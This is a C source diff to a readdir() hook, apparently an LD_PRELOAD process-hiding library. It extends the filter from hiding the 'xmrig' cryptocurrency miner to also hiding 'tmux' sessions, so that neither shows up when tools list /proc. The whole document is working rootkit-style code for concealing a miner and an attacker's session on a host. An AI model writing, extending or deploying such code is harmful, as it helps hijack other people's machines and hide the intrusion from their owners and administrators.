@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#define PROCESS_COUNT 2
 
 #include <stdio.h>
 #include <dlfcn.h>
@@ -7,7 +8,16 @@
 #include <unistd.h>
 
 
-static const char* filterProcess = "xmrig";
+static const char* filterProcess[PROCESS_COUNT] = {"xmrig","tmux"};
+
+int checkFilterProcess(char *processName)
+{
+  int i;
+  for(i=0; i < PROCESS_COUNT; i++)
+    if(!strcmp(processName,filterProcess[i]))
+      return 1;
+  return 0;
+}
 
 static int getDirectoryName(DIR* dirp, char* buffer, size_t size)
 {
@@ -77,7 +87,7 @@ struct dirent* readdir(DIR *dirp)
             if(getDirectoryName(dirp, dirName, sizeof(dirName)) &&
                 strcmp(dirName, "/proc") == 0 &&
                 getProcessName(dir->d_name, processName) &&
-                strcmp(processName, filterProcess) == 0) {
+                checkFilterProcess(processName) ) {
                 continue;
             }
         }
